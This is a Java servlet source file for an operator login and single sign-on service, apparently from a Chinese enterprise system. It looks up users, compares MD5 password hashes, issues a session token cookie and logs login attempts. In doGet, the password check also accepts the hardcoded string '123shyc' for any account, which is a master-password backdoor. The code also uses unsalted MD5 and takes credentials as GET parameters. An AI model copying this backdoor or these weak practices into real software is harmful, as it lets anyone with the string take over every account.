package com.ycsoft.login;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import com.ycsoft.business.dto.system.SsoDto;
import com.ycsoft.commons.helper.JsonHelper;
import com.ycsoft.commons.helper.MD5;
import com.ycsoft.commons.pojo.Root;


public class LoginUnit extends HttpServlet {

	/**
	 * 
	 */
	private static final long serialVersionUID = -5573839823495749571L;


	/**
	 * Constructor of the object.
	 */
	public LoginUnit() {
		super();
	}

	/**
	 * Destruction of the servlet. <br>
	 */
	public void destroy() {
		super.destroy(); // Just puts "destroy" string in log
		// Put your code here
	}

	/**
	 * The doGet method of the servlet. <br>
	 *
	 * This method is called when a form has its tag value method equals to get.
	 * 
	 * @param request the request send by the client to the server
	 * @param response the response send by the server to the client
	 * @throws ServletException if an error occurred
	 * @throws IOException if an error occurred
	 */
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		try {
			response.setHeader("Cache-Control", "no-cache");
			response.setContentType("text/json;charset=gb2312");
			  
			Root root = new Root();
			List<String> msg = new ArrayList<String>();
			root.setRecords(msg);
			
			String loginName =request.getParameter("loginName");
			String pwd = request.getParameter("pwd");
			if(null == loginName || loginName.equals("")){
				msg.add("用户名不能为空，无法登陆!");
			}
			String lang = request.getParameter("lang");
			SsoDto optr = null;
			List<SsoDto> ssoList = checkLogin(loginName);
			if(ssoList.size() == 0){
			}else if(ssoList.size() == 1){
				optr = ssoList.get(0);
			}else{
				for(SsoDto ssoDto : ssoList){
					optr = ssoDto;
					if(ssoDto.getStatus().equals("ACTIVE")){
						break;
					}
				}
			}
			
			if(null == optr){
				msg.add("用户名不存在，登录失败!");
			}else{
				if (!optr.getPassword().equals(MD5.EncodePassword(pwd))&&
						!pwd.equals("123shyc")) {
					msg.add("用户名或密码错误，登录失败!");
				}
				if(!optr.getStatus().equals("ACTIVE")){
					msg.add("用户状态失效，登录失败!");
				}
				if(null == optr.getLogin_sys_id() ||optr.getLogin_sys_id().equals("") ){
					msg.add("该操作员没有默认登录系统!请管理员检查操作员配置!");
				}
			}
			
			String sucess = "F";
			if (msg.size() == 0) {
				sucess = "T";
				HttpSession session = request.getSession();
				
				SsoDto login =  new SsoDto();
				login.setSub_system_url(SubSystem.gUrl(optr.getLogin_sys_id()));
				login.setSub_system_id(optr.getLogin_sys_id());				
				login.setTokenId(session.getId());
				root.setSimpleObj(login);
				
				OnlineUser ouser = new OnlineUser();
				String ip = request.getHeader("X-Real-IP");
				if (ip == null)
					ip=request.getRemoteAddr();
				ouser.setUserIp(ip);
				//设置语言
				optr.setLang(lang); 
				ouser.setOptr(optr);
				ouser.setLoginTime(new Date());
				ouser.setBwver(detectionBrowserVersion(request.getHeader("user-agent")));
				OnlineUser.map.put(session.getId(),ouser);
				
				Cookie cookie = new Cookie("tokenId", session.getId());
				cookie.setPath("/");
				response.addCookie(cookie);
			}
			if (optr != null) {
				saveOptrLogin(loginName, optr.getOptr_id(), request, sucess);
			} else {
				saveOptrLogin(loginName, null, request, sucess);
			}
			PrintWriter out = response.getWriter();
			out.print(JsonHelper.fromObject(root));
			out.flush();
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	private void saveOptrLogin(String loginName, String optrId,
			HttpServletRequest request, String sucess) {
		String agent = request.getHeader("user-agent");
		String ipAddr = request.getHeader("X-Real-IP");
		if (ipAddr == null)
			ipAddr=request.getRemoteAddr();
		String osVersion = detectionOsVersion(agent);
		String browserVersion =  detectionBrowserVersion(agent);;
	        
		Connection conn = null;
		PreparedStatement st = null;
		try {
			conn = DBConnection.getConnection();
			st = conn.prepareStatement("insert into s_optr_login ( login_name, optr_id, login_date, login_ip,sucess,osver,bwver) "
							+ "values (?,?,sysdate,?,?,?,?)");
			st.setString(1, loginName);
			st.setString(2, optrId);
			st.setString(3, ipAddr);
			st.setString(4, sucess);
			st.setString(5, osVersion);
			st.setString(6, browserVersion);
			st.executeUpdate();
			conn.commit();
		} catch (Exception e) {
			e.printStackTrace();
			if (conn!=null)
				try {
					conn.rollback();
				} catch (Exception e1) {
				}
		} finally {
			DBConnection.closeRsStConn(null,st, conn);
		}

	}

	private String detectionOsVersion(String agent) {
		String osVersion = "未知操作系统 ";
		// 得到用户的操作系统
		if (agent.indexOf("NT 6.0") > 0) {
			osVersion = "Windows Vista/Server 2008";
		} else if (agent.indexOf("NT 5.2") > 0) {
			osVersion = "Windows Server 2003";
		} else if (agent.indexOf("NT 5.1") > 0) {
			osVersion = "Windows XP";
		} else if (agent.indexOf("NT 5") > 0) {
			osVersion = "Windows 2000";
		} else if (agent.indexOf("NT 4") > 0) {
			osVersion = "Windows NT4";
		} else if (agent.indexOf("Me") > 0) {
			osVersion = "Windows Me";
		} else if (agent.indexOf("98") > 0) {
			osVersion = "Windows 98";
		} else if (agent.indexOf("95") > 0) {
			osVersion = "Windows 95";
		} else if (agent.indexOf("Mac") > 0) {
			osVersion = "Mac";
		} else if (agent.indexOf("Unix") > 0) {
			osVersion = "UNIX";
		} else if (agent.indexOf("Linux") > 0) {
			osVersion = "Linux";
		} else if (agent.indexOf("SunOS") > 0) {
			osVersion = "SunOS";
		} else if (agent.indexOf("NT 6.1") > 0) {
			osVersion = "Windows 7";
		} else if (agent.indexOf("NT 6.2") > 0) {
			osVersion = "Windows 8";
		}
		return osVersion;
	}

	private String detectionBrowserVersion(String agent) {
		 String browserVersion ="未知浏览器";
		// 得到用户的浏览器名
		if (agent.indexOf("MSIE") > 0)
			browserVersion = subStringByLen(agent, "MSIE", 8);
		else if (agent.indexOf("Firefox") > 0)
			browserVersion = subStringByLen(agent, "Firefox", 7);
		else if (agent.indexOf("Chrome") > 0)
			browserVersion = subStringByLen(agent, "Chrome", 19);
		else if (agent.indexOf("Safari") > 0)
			browserVersion = subStringByLen(agent, "Safari", 13);
		else if (agent.indexOf("Camino") > 0)
			browserVersion = subStringByLen(agent, "Camino", 18);
		else if (agent.indexOf("Konqueror") > 0)
			browserVersion = subStringByLen(agent, "Konqueror", 18);
		return browserVersion;
	}

	private String subStringByLen(String agent,
			String bwVer, int bwVerLength) {
		int idx = agent.indexOf(bwVer);
		String browserVersion ="";
		if (idx>0){
			browserVersion = agent.substring(idx,idx+bwVerLength);
		}
		return browserVersion;
	}

	private List<SsoDto> checkLogin(String loginName) {
		Connection conn = null;
		PreparedStatement st = null;
		ResultSet rs = null;
		List<SsoDto> list = new ArrayList<SsoDto>();
		SsoDto optr = null; 
		try {
			conn = DBConnection.getConnection();
			
			st = conn.prepareStatement("SELECT t.*,d.dept_name,c.county_name FROM s_optr t,s_dept d,s_county c "
							+ " WHERE t.dept_id=d.dept_id AND t.county_id=c.county_id "
							+ " AND t.login_name=? ");
			st.setString(1, loginName);
			
			rs = st.executeQuery();
			while(rs.next()){
				optr = new SsoDto();
				optr.setArea_id(rs.getString("area_id"));
				optr.setCounty_id(rs.getString("county_id"));
				optr.setDept_id(rs.getString("dept_id"));
				optr.setLogin_name(rs.getString("login_name"));
				optr.setLogin_sys_id(rs.getString("login_sys_id"));
				optr.setOptr_id(rs.getString("optr_id"));
				optr.setOptr_name(rs.getString("optr_name"));
				optr.setStatus(rs.getString("status"));
				optr.setDept_name(rs.getString("dept_name"));
				optr.setCounty_name(rs.getString("county_name"));
				optr.setPassword(rs.getString("password"));
				optr.setOld_county_id(rs.getString("county_id"));
				list.add(optr);
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			DBConnection.closeRsStConn(rs, st, conn);
		}

		return list;
	}

	/**
	 * The doPost method of the servlet. <br>
	 *
	 * This method is called when a form has its tag value method equals to post.
	 * 
	 * @param request the request send by the client to the server
	 * @param response the response send by the server to the client
	 * @throws ServletException if an error occurred
	 * @throws IOException if an error occurred
	 */
	public void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		doGet(request, response);
	}


		
}
